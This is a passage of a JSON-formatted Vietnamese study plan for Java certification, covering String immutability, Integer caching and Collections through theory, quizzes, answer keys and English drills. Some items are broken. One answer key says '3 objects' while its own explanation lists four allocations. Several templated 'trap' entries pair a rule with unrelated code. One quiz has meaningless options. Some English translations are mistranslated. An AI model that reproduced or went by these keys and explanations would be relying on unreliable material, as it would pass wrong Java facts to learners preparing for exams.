          "code": "String s1 = \"Hello\";\nString s2 = \"Hello\";\nString s3 = new String(\"Hello\");\n\nSystem.out.println(s1 == s2); // true (Cùng trỏ vào String Pool)\nSystem.out.println(s1 == s3); // false (s3 nằm ngoài Heap độc lập)\nSystem.out.println(s1.equals(s3)); // true (So sánh nội dung)\nSystem.out.println(s1 == s3.intern()); // true (intern lấy tham chiếu trong Pool)\n\nString text = \"abc\";\ntext.concat(\"def\");\nSystem.out.println(text); // In ra \"abc\" vì String bất biến!"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d15_1",
          "level": "Medium",
          "question": "Chương trình sau in ra bao nhiêu đối tượng String được tạo ra trên bộ nhớ?",
          "code": "public class StringPoolTrace {\n    public static void main(String[] args) {\n        String s1 = \"FPT\";\n        String s2 = \"FPT\";\n        String s3 = new String(\"FPT\");\n        String s4 = s1 + \" Software\";\n    }\n}",
          "options": [
            "3 đối tượng",
            "4 đối tượng",
            "2 đối tượng",
            "5 đối tượng"
          ],
          "correctIndex": 0,
          "explanation": "1. `String s1 = \"FPT\";`: Tạo 1 chuỗi 'FPT' trong String Pool.\n2. `String s2 = \"FPT\";`: Dùng lại chuỗi trong Pool (không tạo mới).\n3. `String s3 = new String(\"FPT\");`: Tạo 1 đối tượng String mới trên Heap (lưu ý chuỗi 'FPT' đã có trong pool nên chỉ tạo 1 object trên Heap).\n4. `s4 = s1 + \" Software\"`: ' Software' tạo 1 chuỗi trong pool, kết quả nối tạo 1 chuỗi 'FPT Software' trên Heap.\nTổng cộng 3 đối tượng độc lập được cấp phát."
        }
      ],
      "examTraps": [
        {
          "trap": "Quên hứng giá trị trả về của phương thức String",
          "whyPeopleWrong": "Quen với việc các phương thức của List/Set làm thay đổi trực tiếp đối tượng.",
          "wrongThinking": "Tưởng rằng str.trim() hoặc str.toUpperCase() sẽ tự động thay đổi chuỗi str hiện tại.",
          "correctRule": "String là Immutable. Mọi phương thức xử lý chuỗi đều trả về một String mới. Muốn cập nhật bắt buộc phải gán lại: str = str.trim();",
          "code": "String s = \" a \";\ns.trim();\nSystem.out.println(s.length()); // Vẫn in ra 3 (Chưa được gán lại!)",
          "miniCheck": "Xem sau khi gọi hàm String có phép gán dấu '=' hay không!"
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Tính bất biến của String",
          "questions": [
            {
              "q": "Tính bất biến (Immutability) của String trong Java có nghĩa là gì?",
              "ans": "Một khi đối tượng String được tạo ra trên Heap, trạng thái và nội dung chuỗi ký tự của nó không thể bị sửa đổi. Mọi thao tác như `concat()`, `replace()`, `substring()` đều tạo ra một đối tượng String mới."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "String Constant Pool và hàm intern()",
          "questions": [
            {
              "q": "Hàm `s.intern()` hoạt động như thế nào trong JVM?",
              "ans": "Khi gọi `intern()`, JVM sẽ kiểm tra trong String Constant Pool: Nếu đã tồn tại chuỗi có nội dung bằng `s` (theo `equals()`), nó trả về tham chiếu đến chuỗi trong Pool. Nếu chưa có, chuỗi `s` sẽ được thêm vào Pool và trả về tham chiếu đó."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace tham chiếu String Pool vs Heap",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nString s1 = \"Java\";\nString s2 = new String(\"Java\");\nString s3 = s2.intern();\nSystem.out.println((s1 == s2) + \" \" + (s1 == s3));\n```\nKết quả in ra là gì?",
              "ans": "In ra: `false true`. `s1` trỏ vào Pool, `s2` trỏ vào Heap mới tạo nên `s1 == s2` là false. `s2.intern()` trả về tham chiếu của đối tượng trong Pool (chính là `s1`), nên `s1 == s3` là true."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy nối chuỗi bằng toán tử + với biến",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nString s1 = \"Hello World\";\nString s2 = \"Hello \" + \"World\";\nString h = \"Hello \";\nString s3 = h + \"World\";\nSystem.out.println((s1 == s2) + \" \" + (s1 == s3));\n```\nKết quả in ra là gì?",
              "ans": "In ra: `true false`. `s2` nối 2 hằng số (constants) được compiler tối ưu tại compile-time thành `\"Hello World\"` và trỏ vào Pool (trùng `s1`). `s3` nối với biến `h` nên được tính tại runtime thông qua `StringBuilder`, tạo object mới trên Heap ngoài Pool."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "StringBuilder capacity growth",
          "questions": [
            {
              "q": "Khi `StringBuilder` bị vượt quá dung lượng hiện tại, dung lượng mới (capacity) được mở rộng theo công thức nào?",
              "ans": "Công thức mở rộng chuẩn của JVM: `newCapacity = (oldCapacity * 2) + 2`. Nếu dung lượng mới vẫn không đủ chứa chuỗi mới, nó sẽ nhận độ dài của chuỗi mới cần lưu."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_15_1",
          "q": "Xét 2 phát biểu sau về StringBuffer và StringBuilder:\n(1) StringBuffer có các phương thức synchronized nên an toàn trong môi trường đa luồng.\n(2) StringBuilder có hiệu năng xử lý chuỗi nhanh hơn StringBuffer trong môi trường đơn luồng.\nKhẳng định nào đúng?",
          "options": [
            "Cả (1) và (2) đều đúng",
            "Chỉ (1) đúng",
            "Chỉ (2) đúng",
            "Cả (1) và (2) đều sai"
          ],
          "correct": 0,
          "exp": "Cả hai khẳng định đều hoàn toàn chính xác theo đặc tả Java. StringBuffer an toàn đa luồng nhưng chậm hơn, StringBuilder không synchronized nên nhanh hơn và được khuyến khích dùng đơn luồng."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tính chất bất biến (Immutability) của `String` hoạt động như thế nào?",
          "a": "Khi đối tượng String được tạo ra, nội dung chuỗi ký tự bên trong mảng `char[]`/`byte[]` không thể thay đổi. Mọi phương thức như `concat()`, `replace()`, `toLowerCase()` đều tạo ra một đối tượng String MỚI trên Heap.",
          "trap": "Gọi `s.concat(\"abc\");` mà không gán lại `s = s.concat(\"abc\");` thì biến `s` ban đầu hoàn toàn giữ nguyên giá trị!"
        },
        {
          "q": "Sự khác biệt giữa `String s = \"abc\";` và `String s = new String(\"abc\");`?",
          "a": "- `\"abc\"`: Tìm trong String Constant Pool, nếu có thì tái sử dụng tham chiếu, nếu chưa có thì tạo mới trong Pool.\n- `new String(\"abc\")`: Luôn luôn tạo một đối tượng mới hoàn toàn trên vùng nhớ thông thường của Heap (và tạo thêm 1 bản trong Pool nếu Pool chưa có).",
          "trap": "`s1 == s2` với chuỗi literal là `true`, nhưng so sánh chuỗi tạo bằng `new` là `false` vì khác địa chỉ bộ nhớ!"
        },
        {
          "q": "So sánh hiệu năng và tính an toàn đa luồng giữa `StringBuilder` và `StringBuffer`?",
          "a": "- `StringBuilder`: Không đồng bộ (non-synchronized), hiệu năng nhanh nhất, dùng cho đơn luồng.\n- `StringBuffer`: Có đồng bộ (`synchronized` trên các method), an toàn đa luồng (thread-safe), nhưng chậm hơn do chi phí khóa monitor.",
          "trap": "Cả 2 class này đều là Mutable, phương thức `.append()` thay đổi trực tiếp trên đối tượng mà không tạo mới."
        }
      ],
      "dailyEnglish": [
        {
          "id": 43,
          "vi": "- Hàm kiểm tra 1 đối tượng có tồn tại ít nhát 1 thuộc tính rỗng",
          "en": "Function of checking 1 object which exists at least 1 property"
        },
        {
          "id": 44,
          "vi": "Xử lý sự kiện khi người dùng click vào button XXX",
          "en": "Process event when user clicks button XXX"
        },
        {
          "id": 45,
          "vi": "- Chuyển đổi biến A có kiểu dữ liệu  BBB  sang biến C có kiểu dữ liệu DDD",
          "en": "Convert variable A with BBB data type to variable C with DDD data type"
        },
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        }
      ],
      "chapter": "Chapter 6: String, StringBuffer, Immutability"
    },
    "16": {
      "day": 16,
      "week": 3,
      "title": "Chapter 6: Wrapper Classes & Math",
      "topics": [
        "Wrapper classes: Integer, Double, Boolean...",
        "Autoboxing & Unboxing",
        "Integer Cache (-128 đến 127): Integer a = 100, b = 100 -> a == b?",
        "Math class methods: abs, ceil, floor, round, random"
      ],
      "tasks": [
        "Test bẫy Integer Cache",
        "Làm 20 câu Wrapper & Math"
      ],
      "englishDrill": [
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        },
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        }
      ],
      "summary": "Chapter 6: Wrapper Classes, Autoboxing/Unboxing & Integer Cache (-128..127).",
      "coreTheory": "\n### 1. Wrapper Classes & Autoboxing\n- Mỗi kiểu nguyên thủy có một Wrapper tương ứng: `Integer`, `Double`, `Boolean`, `Character`...\n- **Autoboxing:** Tự động chuyển primitive sang Wrapper (`Integer x = 10;`).\n- **Unboxing:** Tự động chuyển Wrapper sang primitive (`int y = x;`).\n\n### 2. Bẫy Integer Cache (-128 đến 127)\n- Java lưu sẵn bộ đệm các đối tượng Integer từ **-128 đến 127**.\n- Khi autoboxing trong khoảng này, Java dùng lại cùng 1 object trong cache $\\rightarrow$ so sánh `==` ra `true`.\n- Ngoài khoảng này (ví dụ 128 trở lên), Java tạo object mới trên Heap $\\rightarrow$ so sánh `==` ra `false`!\n",
      "codeSnippet": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true (nằm trong cache)\n\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false (ngoài cache, tạo 2 object khác nhau!)\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)",
      "traps": [
        "So sánh `==` giữa các Wrapper ngoài khoảng -128..127 trả về false.",
        "Unboxing đối tượng Wrapper mang giá trị null sẽ ném `NullPointerException`."
      ],
      "quickQuiz": [
        {
          "q": "Tại sao luôn nên dùng `.equals()` khi so sánh Integer?",
          "a": "Để tránh bẫy Integer Cache khi giá trị vượt quá 127."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Wrapper classes: Integer, Double, Boolean..., Autoboxing & Unboxing, Integer Cache (-128 đến 127): Integer a = 100, b = 100 -> a == b?.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Wrapper Classes & Autoboxing\n- Mỗi kiểu nguyên thủy có một Wrapper tương ứng: `Integer`, `Double`, `Boolean`, `Character`...\n- **Autoboxing:** Tự động chuyển primitive sang Wrapper (`Integer x = 10;`).\n- **Unboxing:** Tự động chuyển Wrapper sang primitive (`int y = x;`).\n\n### 2. Bẫy Integer Cache (-128 đến 127)\n- Java lưu sẵn bộ đệm các đối tượng Integer từ **-128 đến 127**.\n- Khi autoboxing trong khoảng này, Java dùng lại cùng 1 object trong cache $\\rightarrow$ so sánh `==` ra `true`.\n- Ngoài khoảng này (ví dụ 128 trở lên), Java tạo object mới trên Heap $\\rightarrow$ so sánh `==` ra `false`!\n",
          "code": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true (nằm trong cache)\n\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false (ngoài cache, tạo 2 object khác nhau!)\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_16_1",
          "level": "Easy",
          "question": "Tại sao luôn nên dùng `.equals()` khi so sánh Integer?",
          "code": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true (nằm trong cache)\n\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false (ngoài cache, tạo 2 object khác nhau!)\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Để tránh bẫy Integer Cache khi giá trị vượt quá 127."
        }
      ],
      "examTraps": [
        {
          "trap": "So sánh toán tử == trên đối tượng Wrapper thay vì dùng .equals()",
          "whyPeopleWrong": "Thấy Integer a = 10, b = 10; a == b ra true nên lầm tưởng == luôn so sánh được số.",
          "wrongThinking": "Quên mất Wrapper là Object và chỉ được cache từ -128 đến 127.",
          "correctRule": "Khi so sánh hai đối tượng Wrapper, LUÔN LUÔN dùng phương thức .equals(), tuyệt đối không dùng == vì khi giá trị vượt quá 127 sẽ bị sai logic!",
          "code": "Integer x = 1000, y = 1000;\nSystem.out.println(x == y); // FALSE!\nSystem.out.println(x.equals(y)); // TRUE chuẩn xác!",
          "miniCheck": "So sánh Wrapper class luôn dùng .equals()."
        },
        {
          "trap": "Cạm bẫy 1: So sánh `==` giữa các Wrapper ngoài khoảng -128..127 trả về false.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true (nằm trong cache)\n\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false (ngoài cache, tạo 2 object khác nhau!)\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Unboxing đối tượng Wrapper mang giá trị null sẽ ném `NullPointerException`.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "Integer a = 127, b = 127;\nSystem.out.println(a == b); // true (nằm trong cache)\n\nInteger c = 128, d = 128;\nSystem.out.println(c == d); // false (ngoài cache, tạo 2 object khác nhau!)\nSystem.out.println(c.equals(d)); // true (luôn so sánh bằng equals)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Wrapper Classes và Integer Cache",
          "questions": [
            {
              "q": "Khoảng giá trị mặc định được lưu trong Integer Cache của Java là từ bao nhiêu đến bao nhiêu?",
              "ans": "Từ `-128` đến `127`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Autoboxing và Unboxing pitfalls",
          "questions": [
            {
              "q": "Tại sao đoạn code `Integer i = null; int x = i;` lại gây ra NullPointerException lúc Runtime?",
              "ans": "Dòng `int x = i;` kích hoạt cơ chế Unboxing, compiler tự động sinh ra mã byte-code: `int x = i.intValue();`. Do tham chiếu `i` đang là `null`, việc gọi phương thức `intValue()` trên tham chiếu null ném ra `NullPointerException`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace toán tử == trên Wrapper Integer",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nInteger a = 100, b = 100;\nInteger c = 200, d = 200;\nSystem.out.println((a == b) + \" \" + (c == d));\n```\nKết quả in ra là gì?",
              "ans": "In ra: `true false`. `100` nằm trong khoảng Integer Cache (-128 đến 127) nên `a` và `b` cùng trỏ tới 1 object được cache sẵn. `200` nằm ngoài cache, JVM phải `new Integer(200)` hai lần tạo 2 object riêng biệt trên Heap, nên `c == d` trả về false."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy equals() giữa hai Wrapper khác kiểu",
          "questions": [
            {
              "q": "Biểu thức `new Long(10).equals(new Integer(10))` trả về kết quả gì?",
              "ans": "Trả về `false`! Hàm `equals()` của tất cả các Wrapper class đều kiểm tra kiểu dữ liệu đầu tiên bằng `instanceof`. Khác kiểu thì lập tức trả về false, không bao giờ tự động ép kiểu so sánh giá trị số."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Tùy biến kích thước Integer Cache",
          "questions": [
            {
              "q": "Làm thế nào để thay đổi giới hạn trên của Integer Cache trong máy ảo JVM khi khởi động ứng dụng?",
              "ans": "Sử dụng tham số dòng lệnh JVM option: `-XX:AutoBoxCacheMax=<size>` (ví dụ `-XX:AutoBoxCacheMax=1000`)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_16_1",
          "q": "Xét đoạn mã:\n```java\nInteger a = 127, b = 127;\nInteger c = 128, d = 128;\nSystem.out.print((a == b) + \" \" + (c == d));\n```\nKết quả in ra là gì?",
          "options": [
            "true false",
            "true true",
            "false false",
            "false true"
          ],
          "correct": 0,
          "exp": "Java Wrapper Cache lưu trữ sẵn các đối tượng Integer có giá trị từ -128 đến 127. Với a và b (127), cả hai cùng trỏ tới 1 object trong cache -> a == b là true. Với c và d (128 vượt quá 127), Java tạo 2 đối tượng độc lập trên Heap -> c == d là false."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Cơ chế Integer Cache trong Java hoạt động trong khoảng giá trị nào?",
          "a": "JVM lưu cache các đối tượng `Integer` có giá trị từ `-128` đến `127`. Trong khoảng này, phép gán autoboxing (`Integer a = 100; Integer b = 100;`) sẽ trỏ cùng 1 đối tượng trong cache (`a == b` trả về `true`). Ngoài khoảng này (vd 200), `a == b` là `false`.",
          "trap": "Luôn luôn dùng `.equals()` để so sánh giá trị Wrapper objects, tuyệt đối không dùng `==`!"
        },
        {
          "q": "Điều gì xảy ra khi Unboxing một biến Wrapper có giá trị `null`?",
          "a": "JVM sẽ ném ngoại lệ `NullPointerException` (NPE) tại runtime. Ví dụ: `Integer i = null; int x = i;` -> ném NPE vì gọi ngầm định `i.intValue()` trên con trỏ null.",
          "trap": "Đề thi hay ẩn phép unboxing trong toán tử 3 ngôi hoặc phép tính số học gây crash runtime."
        },
        {
          "q": "Sự khác biệt giữa `Integer.parseInt(\"123\")` và `Integer.valueOf(\"123\")`?",
          "a": "- `parseInt()` trả về kiểu nguyên thủy `int` (primitive).\n- `valueOf()` trả về đối tượng `Integer` (Wrapper object) và có tận dụng Integer Cache.",
          "trap": "Cả 2 hàm đều ném `NumberFormatException` nếu chuỗi truyền vào không đúng định dạng số hợp lệ."
        }
      ],
      "dailyEnglish": [
        {
          "id": 46,
          "vi": "Lấy ra đối tượng với tham số truyền vào",
          "en": "Get objects with inputted parameter"
        },
        {
          "id": 47,
          "vi": "Tạo mới 1 mảng bằng cách cắt chuỗi với tham số truyền vào (split())",
          "en": "Create 1 class by cutting string with inputted parameter"
        },
        {
          "id": 48,
          "vi": "-Export danh sách student theo kết quả search được khi người dùng button xxx",
          "en": "Export student list by result of searching when user clicks button xxx"
        },
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        }
      ],
      "chapter": "Chapter 6: Wrapper Classes & Autoboxing"
    },
    "17": {
      "day": 17,
      "week": 3,
      "title": "Chapter 7: Collections Framework (Phần 1)",
      "topics": [
        "Collection hierarchy: Collection vs Collections (utility)",
        "List interface: ArrayList, LinkedList, Vector",
        "Set interface: HashSet, LinkedHashSet, TreeSet",
        "Duplicate, Ordered, Sorted matrix"
      ],
      "tasks": [
        "Lập bảng ma trận so sánh List và Set",
        "Thực hành TreeSet và quy tắc phần tử phải implement Comparable"
      ],
      "englishDrill": [
        {
          "id": 49,
          "vi": "-Hàm delete 1 đối tượng đang hiển thị trên màn hình  khi người dùng button xxx",
          "en": "Function of deleting1 object which show on screen when  user click button xxx"
        },
        {
          "id": 50,
          "vi": "-Hàm thực hiện lọc theo yes/no khi người dùng checke/uncheck vào checkbox",
          "en": "Function of filtering by yes/no when user chooses check/uncheck into checkbox"
        },
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        }
      ],
      "summary": "Chapter 7: Collections Framework (Phần 1) - List, Set Hierarchy & Ma trận so sánh.",
      "coreTheory": "\n### 1. Phân cấp Collection Interface\n- `Collection` (interface gốc) $\\rightarrow$ `List`, `Set`, `Queue`.\n- **List:** Cho phép trùng lặp (Duplicate: YES). Có thứ tự theo chỉ mục chèn (Ordered: YES).\n  - `ArrayList`: Mảng động, truy xuất $O(1)$, chèn/xóa ở giữa chậm $O(N)$.\n  - `LinkedList`: Danh sách liên kết kép, chèn/xóa đầu/cuối nhanh, truy xuất ngẫu nhiên $O(N)$.\n  - `Vector`: Cổ điển, Thread-safe (synchronized), hiệu năng chậm.\n- **Set:** KHÔNG cho phép trùng lặp (Duplicate: NO).\n  - `HashSet`: Dựa trên HashMap, không bảo đảm thứ tự, $O(1)$.\n  - `LinkedHashSet`: Duy trì thứ tự chèn phần tử.\n  - `TreeSet`: Tự động sắp xếp (Sorted: YES). Phần tử bắt buộc phải implement `Comparable` (nếu không sẽ ném ClassCastException lúc runtime).\n",
      "codeSnippet": "List<String> list = new ArrayList<>();\nlist.add(\"A\"); list.add(\"A\"); // Hợp lệ (cho phép trùng)\n\nSet<String> set = new HashSet<>();\nset.add(\"A\"); set.add(\"A\"); // set.size() vẫn bằng 1 (loại trùng)",
      "traps": [
        "TreeSet thêm object không implement Comparable bị ClassCastException lúc chạy.",
        "Map KHÔNG KẾ THỪA từ Collection interface."
      ],
      "quickQuiz": [
        {
          "q": "Set nào vừa loại bỏ trùng lặp vừa bảo toàn thứ tự chèn?",
          "a": "LinkedHashSet"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐",
      "priority": "🔴 MUST KNOW (Java Core Cốt Lõi)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Collection hierarchy: Collection vs Collections (utility), List interface: ArrayList, LinkedList, Vector, Set interface: HashSet, LinkedHashSet, TreeSet.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Phân cấp Collection Interface\n- `Collection` (interface gốc) $\\rightarrow$ `List`, `Set`, `Queue`.\n- **List:** Cho phép trùng lặp (Duplicate: YES). Có thứ tự theo chỉ mục chèn (Ordered: YES).\n  - `ArrayList`: Mảng động, truy xuất $O(1)$, chèn/xóa ở giữa chậm $O(N)$.\n  - `LinkedList`: Danh sách liên kết kép, chèn/xóa đầu/cuối nhanh, truy xuất ngẫu nhiên $O(N)$.\n  - `Vector`: Cổ điển, Thread-safe (synchronized), hiệu năng chậm.\n- **Set:** KHÔNG cho phép trùng lặp (Duplicate: NO).\n  - `HashSet`: Dựa trên HashMap, không bảo đảm thứ tự, $O(1)$.\n  - `LinkedHashSet`: Duy trì thứ tự chèn phần tử.\n  - `TreeSet`: Tự động sắp xếp (Sorted: YES). Phần tử bắt buộc phải implement `Comparable` (nếu không sẽ ném ClassCastException lúc runtime).\n",
          "code": "List<String> list = new ArrayList<>();\nlist.add(\"A\"); list.add(\"A\"); // Hợp lệ (cho phép trùng)\n\nSet<String> set = new HashSet<>();\nset.add(\"A\"); set.add(\"A\"); // set.size() vẫn bằng 1 (loại trùng)"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d17_1",
          "level": "Medium",
          "question": "Đoạn code thao tác với List sau in ra kết quả gì?",
          "code": "import java.util.*;\npublic class ListTrap {\n    public static void main(String[] args) {\n        List<Integer> list = new ArrayList<>();\n        list.add(1);\n        list.add(2);\n        list.add(3);\n        list.remove(1);\n        System.out.println(list);\n    }\n}",
          "options": [
            "[1, 3]",
            "[2, 3]",
            "[1, 2]",
            "Compile Error do ambiguous method remove"
          ],
          "correctIndex": 0,
          "explanation": "Class `List` có 2 phương thức `remove()` bị overload: `remove(int index)` và `remove(Object o)`. Khi truyền số nguyên nguyên thủy `1`, Java ưu tiên gọi `remove(int index)` xóa phần tử tại chỉ số 1 (chính là số 2). Danh sách còn lại: `[1, 3]`. Nếu muốn xóa số 1, phải viết `list.remove(Integer.valueOf(1))`."
        }
      ],
      "examTraps": [
        {
          "trap": "Dùng TreeSet với đối tượng không implements Comparable",
          "whyPeopleWrong": "Tưởng rằng TreeSet tự động thêm được mọi object như HashSet.",
          "wrongThinking": "Quên rằng TreeSet cần so sánh để sắp xếp cây đỏ đen.",
          "correctRule": "Khi add một đối tượng vào TreeSet mà đối tượng đó không implements Comparable và TreeSet không truyền Comparator, chương trình sẽ văng ngoại lệ ClassCastException lúc Runtime!",
          "code": "TreeSet<Person> set = new TreeSet<>();\n// set.add(new Person(\"Nam\")); // RUNTIME EXCEPTION: ClassCastException (Person cannot be cast to Comparable)!",
          "miniCheck": "Dùng TreeSet hoặc TreeMap bắt buộc class phải có Comparable hoặc truyền Comparator."
        },
        {
          "trap": "Cạm bẫy 1: TreeSet thêm object không implement Comparable bị ClassCastException lúc chạy.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "List<String> list = new ArrayList<>();\nlist.add(\"A\"); list.add(\"A\"); // Hợp lệ (cho phép trùng)\n\nSet<String> set = new HashSet<>();\nset.add(\"A\"); set.add(\"A\"); // set.size() vẫn bằng 1 (loại trùng)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Map KHÔNG KẾ THỪA từ Collection interface.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "List<String> list = new ArrayList<>();\nlist.add(\"A\"); list.add(\"A\"); // Hợp lệ (cho phép trùng)\n\nSet<String> set = new HashSet<>();\nset.add(\"A\"); set.add(\"A\"); // set.size() vẫn bằng 1 (loại trùng)",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Đặc tính của List và Set",
          "questions": [
            {
              "q": "Sự khác biệt cốt lõi về lưu trữ dữ liệu giữa `List` và `Set` là gì?",
              "ans": "`List` duy trì thứ tự chèn (ordered by index) và CHO PHÉP phần tử trùng lặp. `Set` KHÔNG cho phép phần tử trùng lặp (duplication disallowed)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "ArrayList vs LinkedList",
          "questions": [
            {
              "q": "Khi nào nên dùng `ArrayList` và khi nào nên dùng `LinkedList`?",
              "ans": "Dùng `ArrayList` khi thao tác chủ yếu là tìm kiếm và truy xuất ngẫu nhiên theo chỉ số index (`O(1)`). Dùng `LinkedList` khi thường xuyên thêm/xóa phần tử ở đầu danh sách hoặc giữa chừng (`O(1)` nếu đã có node pointer, tránh được việc sao chép mảng)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
